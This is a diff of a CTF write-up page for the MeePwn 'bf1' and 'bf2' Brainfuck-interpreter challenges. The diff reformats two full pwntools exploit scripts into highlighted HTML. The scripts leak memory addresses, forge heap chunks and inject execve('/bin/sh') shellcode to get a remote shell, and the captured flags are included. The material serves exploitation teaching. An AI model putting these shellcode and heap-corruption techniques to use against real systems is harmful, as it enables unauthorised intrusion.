@@ -320,68 +320,67 @@
 call rax
 </code></pre></div></div>
 
-<p>```python exp_bf1.py
-#!/usr/bin/env python</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “139.59.244.42”
-PORT = 31337
-ELF_PATH = “./bf1”</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"139.59.244.42"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31337</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./bf1"</span>
 
-<p>context.binary = ELF_PATH
-context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
-context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach</p>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c"># for gdb.attach</span>
 
-<p>elf = context.binary # context.binary is an ELF object</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c"># context.binary is an ELF object</span>
 
-<p>def cmd(s):
-    r.sendlineafter(“»”, s)</p>
+<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt;"</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
 
-<p>def write(move, content):
-    payload = “”
-    if move &lt; 0:
-        payload = “&lt;” * abs(move)
-    else:
-        payload = “&gt;” * abs(move)</p>
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">move</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">if</span> <span class="n">move</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"&lt;"</span> <span class="o">*</span> <span class="nb">abs</span><span class="p">(</span><span class="n">move</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"&gt;"</span> <span class="o">*</span> <span class="nb">abs</span><span class="p">(</span><span class="n">move</span><span class="p">)</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload += ",&gt;"*len(content)
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">",&gt;"</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    
+    <span class="n">cmd</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
 
-cmd(payload)
-r.sendline(content)
-</code></pre></div></div>
 
-<p>sc = “\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05”</p>
+<span class="n">sc</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05</span><span class="s">"</span>
 
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    
+    <span class="c"># leak mmap address </span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"&lt;"</span><span class="o">*</span><span class="mh">0x28</span> <span class="c"># move to &amp;bf_data-&gt;sc_buf</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">".&gt;"</span><span class="o">*</span><span class="mi">8</span>
 
-# leak mmap address 
-payload = "&lt;"*0x28 # move to &amp;bf_data-&gt;sc_buf
-payload += ".&gt;"*8
-
-cmd(payload)
-sc_base = u64(r.recvuntil("&gt;&gt;")[:8:]) &gt;&gt; 8
-r.unrecv("&gt;&gt;")
-log.success("sc_base: "+hex(sc_base))
-
-# make size = 0x400 so it won't clear our shellcode
-write(-0x10, p64(0x400))
-# change bf_data-&gt;dp = our shellcode buffer
-write(-0x30, p64(sc_base+0x800))
-# write final shellcode to our shellcode buffer
-write(0, sc)
-# write to bf_data-&gt;sc_buf ( it will become a self-modified shellcode)
-init_sc = asm("mov rax, %s" % hex(sc_base+0x800))
-init_sc += asm("call rax")
-print "init_sc", init_sc.encode('hex')
-print "len:", len(init_sc)
-write(-0x70d, init_sc)
-r.interactive() ```
+    <span class="n">cmd</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">sc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt;"</span><span class="p">)[:</span><span class="mi">8</span><span class="p">:])</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">unrecv</span><span class="p">(</span><span class="s">"&gt;&gt;"</span><span class="p">)</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sc_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">sc_base</span><span class="p">))</span>
+    
+    <span class="c"># make size = 0x400 so it won't clear our shellcode</span>
+    <span class="n">write</span><span class="p">(</span><span class="o">-</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400</span><span class="p">))</span>
+    <span class="c"># change bf_data-&gt;dp = our shellcode buffer</span>
+    <span class="n">write</span><span class="p">(</span><span class="o">-</span><span class="mh">0x30</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">sc_base</span><span class="o">+</span><span class="mh">0x800</span><span class="p">))</span>
+    <span class="c"># write final shellcode to our shellcode buffer</span>
+    <span class="n">write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">sc</span><span class="p">)</span>
+    <span class="c"># write to bf_data-&gt;sc_buf ( it will become a self-modified shellcode)</span>
+    <span class="n">init_sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"mov rax, </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">sc_base</span><span class="o">+</span><span class="mh">0x800</span><span class="p">))</span>
+    <span class="n">init_sc</span> <span class="o">+=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"call rax"</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">"init_sc"</span><span class="p">,</span> <span class="n">init_sc</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s">"len:"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">init_sc</span><span class="p">)</span>
+    <span class="n">write</span><span class="p">(</span><span class="o">-</span><span class="mh">0x70d</span><span class="p">,</span> <span class="n">init_sc</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>flag: <code class="highlighter-rouge">MeePwnCTF{this_is_simple_challenge_:banana-dance:}</code></p>
@@ -445,108 +444,104 @@ r.interactive() ```
   <li>To avoid the program changing our shellcode into the <code class="highlighter-rouge">ret</code> instruction, we’ll have to overwrite the <code class="highlighter-rouge">bf_data-&gt;sc_pos</code> data as well ( because the program will place the <code class="highlighter-rouge">ret</code> machine code at <code class="highlighter-rouge">bf_data-&gt;sc_buf + bf_data-&gt;sc_pos</code> ). Overwrite this data to a large number, so the <code class="highlighter-rouge">ret</code> instruction won’t effect our shellcode.</li>
 </ol>
 
-<p>Final exploit script:
-```python exp_bf2.py
-#!/usr/bin/env python</p>
+<p>Final exploit script:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
 
-<p>HOST = “139.59.244.42”
-PORT = 31338
-ELF_PATH = “./bf2”</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"139.59.244.42"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">31338</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./bf2"</span>
 
-<p>context.binary = ELF_PATH
-context.log_level = ‘INFO’ # [‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]
-context.terminal = [‘tmux’, ‘splitw’] # for gdb.attach</p>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c"># for gdb.attach</span>
 
-<p>elf = context.binary # context.binary is an ELF object</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c"># context.binary is an ELF object</span>
 
-<p>def cmd(s):
-    r.sendlineafter(“»”, s)</p>
+<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt;&gt;"</span><span class="p">,</span> <span class="n">s</span><span class="p">)</span>
 
-<p>def write(move, content, scmd=None, scontent=None):
-    payload = “”
-    if move &lt; 0:
-        payload = “&lt;” * abs(move)
-    else:
-        payload = “&gt;” * abs(move)</p>
+<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">move</span><span class="p">,</span> <span class="n">content</span><span class="p">,</span> <span class="n">scmd</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">scontent</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+    <span class="k">if</span> <span class="n">move</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"&lt;"</span> <span class="o">*</span> <span class="nb">abs</span><span class="p">(</span><span class="n">move</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"&gt;"</span> <span class="o">*</span> <span class="nb">abs</span><span class="p">(</span><span class="n">move</span><span class="p">)</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload += ",&gt;"*len(content)
-if scmd:
-    payload += scmd
-    content += scontent
-payload = payload.ljust(512, "B")
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">",&gt;"</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">scmd</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">scmd</span>
+        <span class="n">content</span> <span class="o">+=</span> <span class="n">scontent</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">512</span><span class="p">,</span> <span class="s">"B"</span><span class="p">)</span>
+    
+    <span class="n">cmd</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
 
-cmd(payload)
-r.sendline(content)
+
+<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">move</span><span class="p">,</span> <span class="n">cnt</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">move</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"&lt;"</span> <span class="o">*</span> <span class="nb">abs</span><span class="p">(</span><span class="n">move</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="s">"&gt;"</span> <span class="o">*</span> <span class="nb">abs</span><span class="p">(</span><span class="n">move</span><span class="p">)</span>
+
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">".&gt;"</span><span class="o">*</span><span class="n">cnt</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">512</span><span class="p">,</span> <span class="s">"B"</span><span class="p">)</span>
+    
+    <span class="n">cmd</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span> <span class="c"># ¯\_(ツ)_/¯ </span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt;&gt;"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">:]</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">unrecv</span><span class="p">(</span><span class="s">"&gt;&gt;"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ret</span>
+
+<span class="n">sc</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05</span><span class="s">"</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+
+    <span class="n">r</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    
+    <span class="c"># make unsortbin + libc address</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">512</span><span class="p">)</span>
+
+    <span class="c"># leak</span>
+    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">(</span><span class="mh">0x110</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3c3b78</span> <span class="c"># local</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+    <span class="n">heap_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="p">(</span><span class="o">-</span><span class="mh">0x30</span><span class="p">,</span> <span class="mi">8</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"heap_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_addr</span><span class="p">))</span>
+    <span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">-</span> <span class="mh">0x70</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"fake_chunk: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">))</span>
+    <span class="n">sc_buf</span> <span class="o">=</span> <span class="n">heap_addr</span> <span class="o">+</span> <span class="mh">0x3b0</span><span class="c"># our shellcode buffer</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"sc_buf: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">sc_buf</span><span class="p">))</span>
+
+    <span class="c"># fake chunk</span>
+    <span class="n">write</span><span class="p">(</span><span class="o">-</span><span class="mh">0x78</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="p">)</span>
+    <span class="n">special</span> <span class="o">=</span> <span class="s">"&lt;"</span><span class="o">*</span><span class="mh">0xd0</span> <span class="o">+</span> <span class="s">",&gt;"</span><span class="o">*</span><span class="mi">8</span>
+    <span class="c"># fake next size</span>
+    <span class="n">write</span><span class="p">(</span><span class="mh">0x98</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">),</span><span class="n">special</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">))</span>
+    <span class="c"># create gets-like function, puts shellcode @ 0xXXXXX000 ( our shellcode buffer)</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="s">",[&gt;.,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,[&gt;.,]"</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xa1\x01\x02\x00</span><span class="s">"</span> <span class="c"># fake next size</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0x190</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">sc</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00</span><span class="s">"</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="c"># overwrite bf_data, make bf_data-&gt;sc_buf point to our shellcode buffer</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"i"</span><span class="o">*</span><span class="mh">0x40</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">sc_buf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
 </code></pre></div></div>
-
-<p>def leak(move, cnt):
-    if move &lt; 0:
-        payload = “&lt;” * abs(move)
-    else:
-        payload = “&gt;” * abs(move)</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>payload += ".&gt;"*cnt
-payload = payload.ljust(512, "B")
-
-cmd(payload)
-r.recv(1024) # ¯\_(ツ)_/¯ 
-ret = r.recvuntil("&gt;&gt;")[:-2:]
-r.unrecv("&gt;&gt;")
-return ret
-</code></pre></div></div>
-
-<p>sc = “\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05”</p>
-
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
-
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = None
-if len(sys.argv) == 2:
-    r = process(ELF_PATH)
-else:
-    r = remote(HOST, PORT)
-
-# make unsortbin + libc address
-cmd("A"*512)
-
-# leak
-libc.address = u64(leak(0x110, 8)) - 0x3c3b78 # local
-log.success("libc base: "+hex(libc.address))
-heap_addr = u64(leak(-0x30, 8))
-log.success("heap_addr: "+hex(heap_addr))
-fake_chunk = heap_addr - 0x70
-log.success("fake_chunk: "+hex(fake_chunk))
-sc_buf = heap_addr + 0x3b0# our shellcode buffer
-log.success("sc_buf: "+hex(sc_buf))
-
-# fake chunk
-write(-0x78, p64(0x111) )
-special = "&lt;"*0xd0 + ",&gt;"*8
-# fake next size
-write(0x98, p64(0x71),special, p64(fake_chunk))
-# create gets-like function, puts shellcode @ 0xXXXXX000 ( our shellcode buffer)
-cmd(",[&gt;.,]&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;,[&gt;.,]")
-payload = "i"*0x108 + "\xa1\x01\x02\x00" # fake next size
-payload += "i"*0x190
-payload += "\x90"*0x10 + sc + "\x00"
-r.send(payload)
-# overwrite bf_data, make bf_data-&gt;sc_buf point to our shellcode buffer
-payload = "i"*0x40
-payload += p64(0) + p64(sc_buf) + p64(0x100) + p64(100) + p64(0x1000) + p64(0x111)
-cmd(payload)
-r.interactive()
-</code></pre></div></div>
-
-<p>```</p>
 
 <p>flag: <code class="highlighter-rouge">MeePwnCTF{My_M33pwn_h34p_1s_fun?}</code></p>
 
 <p>Got both first blood on these challenges ! WOOHOO ! 😎🤘</p>
-
 
         
       </section>
